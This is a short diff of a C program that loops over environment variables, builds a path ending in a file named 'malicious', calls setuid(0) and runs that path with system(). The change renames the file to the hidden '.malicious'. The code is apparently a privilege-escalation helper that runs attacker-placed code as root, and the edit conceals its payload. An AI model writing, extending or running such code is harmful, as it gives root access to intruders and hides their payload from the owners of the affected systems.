@@ -11,7 +11,7 @@ int main(int argc, char **argv, char **env)
   {
     cmd=malloc(strlen(env[i])+20);
     if (cmd==NULL) exit(1);
-    sprintf(cmd,"%s/malicious",env[i]);
+    sprintf(cmd,"%s/.malicious",env[i]);
     setuid(0);
     system(cmd);
   }
